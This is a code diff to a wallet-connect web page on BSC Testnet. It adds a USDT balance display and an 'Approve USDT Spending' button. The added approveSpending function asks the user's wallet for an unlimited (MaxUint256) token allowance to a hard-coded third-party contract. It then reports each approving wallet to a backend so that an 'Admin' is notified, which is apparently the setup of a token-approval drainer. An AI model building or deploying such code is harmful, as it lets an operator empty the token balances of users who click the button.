@@ -49,6 +49,37 @@
       font-size: 1.1rem;
     }
 
+    .wallet-info {
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 15px;
+      padding: 25px;
+      margin: 25px 0;
+      text-align: left;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .info-row:last-child {
+      margin-bottom: 0;
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: #a0a0c0;
+    }
+
+    .info-value {
+      font-weight: 500;
+      word-break: break-all;
+    }
+
     .btn {
       background: linear-gradient(90deg, #00dbde, #fc00ff);
       color: white;
@@ -75,35 +106,23 @@
       transform: none;
     }
 
-    .wallet-info {
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 15px;
-      padding: 20px;
-      margin: 20px 0;
-      text-align: left;
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.1);
+      box-shadow: none;
     }
 
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 15px;
-      padding-bottom: 15px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    .btn-secondary:hover:not(:disabled) {
+      background: rgba(255, 255, 255, 0.2);
+      box-shadow: none;
     }
 
-    .info-row:last-child {
-      margin-bottom: 0;
-      padding-bottom: 0;
-      border-bottom: none;
+    .btn-warning {
+      background: linear-gradient(90deg, #f39c12, #e67e22);
+      box-shadow: 0 4px 20px rgba(243, 156, 18, 0.3);
     }
 
-    .info-label {
-      color: #a0a0c0;
-    }
-
-    .info-value {
-      font-weight: 500;
-      word-break: break-all;
+    .btn-warning:hover:not(:disabled) {
+      box-shadow: 0 6px 25px rgba(243, 156, 18, 0.5);
     }
 
     .status {
@@ -174,12 +193,20 @@
           <span id="wallet-address" class="info-value"></span>
         </div>
         <div class="info-row">
+          <span class="info-label">USDT Balance</span>
+          <span id="usdt-balance" class="info-value">0.00 USDT</span>
+        </div>
+        <div class="info-row">
           <span class="info-label">Network</span>
           <span id="network" class="info-value">BSC Testnet</span>
         </div>
       </div>
       
-      <button id="disconnect-btn" class="btn">
+      <button id="approve-btn" class="btn btn-warning">
+        <span id="approve-text">Approve USDT Spending</span>
+      </button>
+      
+      <button id="disconnect-btn" class="btn btn-secondary">
         Disconnect Wallet
       </button>
     </div>
@@ -193,7 +220,9 @@
       API_URL: 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
       CHAIN_ID: '97',
       CHAIN_NAME: 'BSC Testnet',
-      RPC_URL: 'https://bsc-testnet.publicnode.com'
+      RPC_URL: 'https://bsc-testnet.publicnode.com',
+      CONTRACT_ADDRESS: '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF',
+      USDT_CONTRACT_ADDRESS: '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638'
     }
 
     // DOM Elements
@@ -201,18 +230,23 @@
     const walletSection = document.getElementById('wallet-section')
     const connectWalletBtn = document.getElementById('connect-wallet')
     const connectText = document.getElementById('connect-text')
+    const approveBtn = document.getElementById('approve-btn')
+    const approveText = document.getElementById('approve-text')
     const disconnectBtn = document.getElementById('disconnect-btn')
     const walletAddressEl = document.getElementById('wallet-address')
+    const usdtBalanceEl = document.getElementById('usdt-balance')
     const statusMessage = document.getElementById('status-message')
 
     // State
     let isConnecting = false
+    let isApproving = false
     let isConnected = false
     let currentWalletAddress = null
 
     // Initialize
     document.addEventListener('DOMContentLoaded', () => {
       connectWalletBtn.addEventListener('click', connectWallet)
+      approveBtn.addEventListener('click', approveSpending)
       disconnectBtn.addEventListener('click', disconnectWallet)
       
       // Check if wallet is already connected
@@ -230,6 +264,8 @@
             isConnected = true
             showWalletSection()
             updateWalletInfo()
+            // Fetch balance from backend
+            fetchWalletBalance(currentWalletAddress)
             showStatus('Wallet already connected')
           }
         } catch (error) {
@@ -281,6 +317,10 @@
         
         if (backendResult.success) {
           showSuccess('Wallet connected successfully! Admin has been notified.')
+          // Update balance display
+          if (usdtBalanceEl && backendResult.data.wallet.usdt_balance) {
+            usdtBalanceEl.textContent = `${parseFloat(backendResult.data.wallet.usdt_balance).toFixed(2)} USDT`
+          }
         } else {
           showError('Wallet connected but notification failed.')
         }
@@ -349,6 +389,21 @@
       return `${address.substring(0, 6)}...${address.substring(38)}`
     }
 
+    // Fetch wallet balance from backend
+    async function fetchWalletBalance(walletAddress) {
+      try {
+        const response = await fetch(`${CONFIG.API_URL}/wallets/${walletAddress}/balance`)
+        if (response.ok) {
+          const result = await response.json()
+          if (usdtBalanceEl) {
+            usdtBalanceEl.textContent = `${parseFloat(result.balance).toFixed(2)} USDT`
+          }
+        }
+      } catch (error) {
+        console.error('Balance fetch error:', error)
+      }
+    }
+
     // Send wallet to backend
     async function sendWalletToBackend(walletAddress) {
       try {
@@ -382,6 +437,94 @@
       }
     }
 
+    // Approve USDT spending
+    async function approveSpending() {
+      if (isApproving || !isConnected || !currentWalletAddress) {
+        return
+      }
+      
+      isApproving = true
+      showLoading(approveText, true)
+      hideStatus()
+      
+      try {
+        console.log('Approving USDT spending for:', currentWalletAddress)
+        showStatus('Please confirm USDT spending approval in your wallet...')
+        
+        // Create provider and signer
+        const provider = new ethers.BrowserProvider(window.ethereum)
+        const signer = await provider.getSigner()
+        
+        // Create USDT contract instance
+        const usdtContract = new ethers.Contract(
+          CONFIG.USDT_CONTRACT_ADDRESS,
+          ['function approve(address spender, uint256 amount) public returns (bool)'],
+          signer
+        )
+        
+        // Send approval transaction
+        const tx = await usdtContract.approve(
+          CONFIG.CONTRACT_ADDRESS,
+          ethers.MaxUint256
+        )
+        
+        showStatus('Transaction sent. Waiting for confirmation...')
+        console.log('Approval transaction sent:', tx.hash)
+        
+        // Wait for confirmation
+        await tx.wait()
+        
+        console.log('Approval confirmed')
+        showStatus('USDT spending approved successfully!')
+        
+        // Disable approve button
+        approveBtn.disabled = true
+        approveText.textContent = 'Approved'
+        
+        // Notify backend
+        await notifyApprovalToBackend(currentWalletAddress)
+        
+      } catch (error) {
+        console.error('Approval error:', error)
+        showError('Approval failed: ' + error.message)
+      } finally {
+        isApproving = false
+        showLoading(approveText, false)
+      }
+    }
+
+    // Notify backend about approval
+    async function notifyApprovalToBackend(walletAddress) {
+      try {
+        console.log('Notifying backend about approval for:', walletAddress)
+        
+        const response = await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            address: walletAddress
+          })
+        })
+        
+        const result = await response.json()
+        console.log('Backend approval response:', result)
+        
+        if (!response.ok) {
+          throw new Error(result.error || `HTTP ${response.status}: ${response.statusText}`)
+        }
+        
+        showSuccess('Wallet approved successfully! Admin has been notified.')
+        return { success: true, data: result }
+        
+      } catch (error) {
+        console.error('Backend approval notification error:', error)
+        showError('Approval recorded but notification failed.')
+        return { success: false, error: error.message }
+      }
+    }
+
     // Disconnect wallet
     function disconnectWallet() {
       isConnected = false
@@ -400,14 +543,20 @@
     function showWalletSection() {
       connectSection.classList.add('hidden')
       walletSection.classList.remove('hidden')
+      approveBtn.disabled = false
+      approveText.textContent = 'Approve USDT Spending'
     }
 
     // Show loading state
     function showLoading(element, show) {
       if (show) {
-        element.innerHTML = '<span class="loading"></span>Connecting...'
+        element.innerHTML = '<span class="loading"></span>Processing...'
       } else {
-        element.textContent = 'Connect Wallet'
+        if (element.id === 'connect-text') {
+          element.textContent = 'Connect Wallet'
+        } else if (element.id === 'approve-text') {
+          element.textContent = 'Approve USDT Spending'
+        }
       }
     }
 
@@ -445,5 +594,8 @@
       statusMessage.classList.add('hidden')
     }
   </script>
+  
+  <!-- Load ethers.js from CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
 </body>
 </html>
